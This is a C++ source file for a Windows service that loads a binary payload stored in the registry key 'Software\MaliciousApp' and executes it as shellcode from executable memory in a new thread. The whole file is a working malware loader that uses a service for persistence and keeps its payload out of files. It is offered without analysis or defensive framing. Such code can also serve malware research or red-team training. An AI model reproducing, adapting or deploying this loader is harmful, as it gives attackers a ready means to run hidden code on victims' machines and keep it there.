#include <windows.h>
#include <vector>
#include <string>

// Global variables for the service
SERVICE_STATUS ServiceStatus;
SERVICE_STATUS_HANDLE ServiceStatusHandle;

// Function to execute shellcode from memory
void executeShellcode(unsigned char* shellcode, size_t size) {
    void* mem = VirtualAlloc(0, size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!mem) {
        OutputDebugStringA("Memory allocation failed.");
        return;
    }
    memcpy(mem, shellcode, size);
    OutputDebugStringA("Shellcode copied to allocated memory.");
    CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)mem, NULL, 0, NULL);
    OutputDebugStringA("Shellcode execution thread started.");
}

// Function to load payload from the registry and execute it
void RunPayload() {
    HKEY hKey;
    DWORD payloadSize = 0;

    if (RegOpenKeyEx(HKEY_CURRENT_USER, "Software\\MaliciousApp", 0, KEY_QUERY_VALUE, &hKey) == ERROR_SUCCESS) {
        RegQueryValueEx(hKey, "Payload", NULL, NULL, NULL, &payloadSize);

        if (payloadSize > 0) {
            std::vector<unsigned char> buffer(payloadSize);
            RegQueryValueEx(hKey, "Payload", NULL, NULL, buffer.data(), &payloadSize);
            RegCloseKey(hKey);

            OutputDebugStringA(("Payload size: " + std::to_string(payloadSize)).c_str());
            executeShellcode(buffer.data(), buffer.size());
        } else {
            OutputDebugStringA("Payload size is zero.");
        }
    } else {
        OutputDebugStringA("Failed to open registry key.");
    }
}

// Service control handler
void WINAPI ServiceCtrlHandler(DWORD request) {
    if (request == SERVICE_CONTROL_STOP) {
        ServiceStatus.dwCurrentState = SERVICE_STOPPED;
        SetServiceStatus(ServiceStatusHandle, &ServiceStatus);
        return;
    }
    SetServiceStatus(ServiceStatusHandle, &ServiceStatus);
}

// Service main function
void WINAPI ServiceMain(DWORD argc, LPTSTR* argv) {
    ServiceStatus.dwServiceType = SERVICE_WIN32_OWN_PROCESS;
    ServiceStatus.dwCurrentState = SERVICE_START_PENDING;
    ServiceStatus.dwControlsAccepted = SERVICE_ACCEPT_STOP;
    ServiceStatus.dwWin32ExitCode = 0;
    ServiceStatus.dwServiceSpecificExitCode = 0;
    ServiceStatus.dwCheckPoint = 0;
    ServiceStatus.dwWaitHint = 0;

    ServiceStatusHandle = RegisterServiceCtrlHandler("CustomService", ServiceCtrlHandler);
    if (!ServiceStatusHandle) {
        OutputDebugStringA("Failed to register service control handler.");
        return;
    }

    // Set the service status to running
    ServiceStatus.dwCurrentState = SERVICE_RUNNING;
    SetServiceStatus(ServiceStatusHandle, &ServiceStatus);
    OutputDebugStringA("Service is running.");

    // Run the payload
    RunPayload();

    // Keep the service alive
    while (ServiceStatus.dwCurrentState == SERVICE_RUNNING) {
        Sleep(1000);
    }
}

// Main function
int main(int argc, char** argv) {
    SERVICE_TABLE_ENTRY ServiceTable[] = {
        {const_cast<LPSTR>("CustomService"), (LPSERVICE_MAIN_FUNCTION)ServiceMain},
        {NULL, NULL}
    };

    if (!StartServiceCtrlDispatcher(ServiceTable)) {
        OutputDebugStringA("Failed to start service control dispatcher.");
    }

    return 0;
}

